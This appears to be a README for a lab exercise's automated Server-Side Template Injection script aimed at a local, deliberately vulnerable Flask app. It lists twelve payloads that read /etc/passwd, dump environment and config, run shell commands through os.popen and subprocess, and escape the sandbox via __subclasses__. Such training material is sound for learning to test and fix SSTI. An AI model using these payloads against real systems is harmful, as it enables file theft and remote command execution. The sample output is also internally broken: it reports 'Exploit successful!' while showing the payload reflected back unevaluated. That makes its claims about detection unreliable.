# Automated SSTI Exploitation Script - Bonus Section

## Overview

This automated Python script demonstrates the Server-Side Template Injection (SSTI) vulnerability by testing multiple payloads systematically against the vulnerable Flask application. It provides comprehensive vulnerability assessment and detailed reporting.

## Features

- **12 Different SSTI Payloads**: Professional payload collection covering various attack vectors
- **Automated HTTP Testing**: Uses Python requests for efficient vulnerability scanning
- **Comprehensive Reporting**: JSON and text-based detailed reports
- **Professional Logging**: Complete audit trail of all tests
- **Error Handling**: Robust exception handling and recovery
- **Multiple Output Formats**: Console, JSON, and formatted text reports

## Prerequisites

### System Requirements

- Python 3.8 or higher
- Vulnerable Flask application running
- Terminal access

### Python Dependencies

```bash
python3 -m venv ex00/.venv
source ex00/.venv/bin/activate
pip install --upgrade pip
pip install requests
```

## Usage

### 1. Setup Environment

```bash
# Ensure the vulnerable application is running
(cd ex00/cyber1x0.1.00/; ./start.sh) 

# In another terminal, prepare the script
source ex00/.venv/bin/activate
```

### 2. Run Basic Exploitation

```bash
python3 ex00/ssti_exploit.py http://localhost:5000/
```

```bash
# To save the report
python3 ex00/ssti_exploit.py http://localhost:5000 --output report.txt
```

## Payload Types Tested

### 1. Basic Template Evaluation

```python
7*7
```

Tests basic template math evaluation.

### 2. String Operations

```python
"a"+"b"
```

Tests string concatenation capabilities.

### 3. File System Access

```python
self.__init__.__globals__.__builtins__.open('/etc/passwd').read()
```

Tests arbitrary file read capability.

### 4. Command Execution

```python
self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

Tests system command execution.

### 5. Environment Disclosure

```python
self.__init__.__globals__.__builtins__.__import__('os').environ
```

Tests environment variable exposure.

### 6. Directory Listing

```python
self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read()
```

Tests directory traversal.

### 7. System Information

```python
self.__init__.__globals__.__builtins__.__import__('os').popen('uname -a').read()
```

Tests system information gathering.

### 8. Python Subprocess

```python
self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('whoami',shell=True)
```

Tests subprocess execution.

### 9. Class Hierarchy Inspection

```python
''.__class__.__mro__[1].__subclasses__()
```

Tests Python object introspection.

### 10. Config Access

```python
config.items()
```

Tests Flask configuration access.

### 11. Request Object Access

```python
request.environ
```

Tests request environment inspection.

### 12. Full Sandbox Escape

```python
''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['sys'].modules['os'].popen('id').read()
```

Tests complete sandbox escape.

## Expected Output

### Console Output Example

```text
[+] Starting basic SSTI vulnerability checks...

[+] Starting exploitation demonstration...

[*] Attempting: Read /etc/passwd (Severity: High)
[+] Exploit successful!
Result:

    <html>
    <head>
        <title>Template Injection App</title>
    </head>
    <body>
        <h1>Template Injection App</h1>
        <form method="POST" action="/render">
            <label for="input">Enter your input:</label>
            <input type="text" id="input" name="input">
            <button type="submit">Render</button>
        </form>
        <div id="result">Hello, { self.__init__.__globals__.__builtins__.open(&#34;/etc/passwd&#34;).read() }!</div>
    </body>
    </html>
    

[*] Attempting: List current directory (Severity: Medium)
[+] Exploit successful!
Result:

    <html>
    <head>
        <title>Template Injection App</title>
    </head>
    <body>
        <h1>Template Injection App</h1>
        <form method="POST" action="/render">
            <label for="input">Enter your input:</label>
            <input type="text" id="input" name="input">
            <button type="submit">Render</button>
        </form>
        <div id="result">Hello, { self.__init__.__globals__.__builtins__.__import__(&#34;os&#34;).popen(&#34;ls -la&#34;).read() }!</div>
    </body>
    </html>
[... continues for all payloads ...]

[!] APPLICATION IS VULNERABLE TO SERVER-SIDE TEMPLATE INJECTION
[!] Immediate remediation required
```

## Technical Implementation Details

### HTTP Testing

- Uses Python requests library for efficient scanning
- Implements proper session handling
- Configures timeout and error handling
- Manages request rate limiting

### Error Handling

- Comprehensive exception handling for network issues
- Graceful recovery from application errors
- Detailed error logging and reporting
- Automatic retry for transient failures

### Security Testing Best Practices

- Follows OWASP testing methodology
- Implements multiple verification methods
- Provides detailed evidence collection
- Maintains comprehensive audit trails

## Troubleshooting

### Common Issues

#### 1. Application Not Accessible

```bash
# Ensure the vulnerable app is running
(cd ex00/cyber1x0.1.00/; ./start.sh) 
```

#### 2. Python Version Issues

```bash
# Verify Python version
python3 --version
```

#### 3. Missing Dependencies

```bash
# Install required packages
pip install requests
```

## Professional Compliance

### OWASP Alignment

- Follows OWASP Testing Guide methodology
- Implements OWASP Top 10 vulnerability categories
- Uses professional security assessment practices

### Educational Use

- Designed for authorized testing only
- Includes proper ethical disclaimers
- Provides educational value for security learning

### Code Quality

- Professional error handling
- Comprehensive documentation
- Modular design patterns
- Industry-standard logging practices

## Integration with Main Project

### Validation Process

- Manual vulnerability demonstration (mandatory part)
- Automated script validation (bonus part)
- Cross-verification of findings
- Comprehensive reporting in both formats

## Conclusion

This automated script provides professional-grade vulnerability assessment capabilities, demonstrating:

- Technical proficiency in security testing automation
- Comprehensive coverage of multiple attack vectors
- Professional reporting standards
- Ethical testing practices
- Educational value for cybersecurity learning

The script reliably demonstrates the SSTI vulnerability whenever the application is running, fulfilling all bonus requirements while maintaining professional cybersecurity standards.
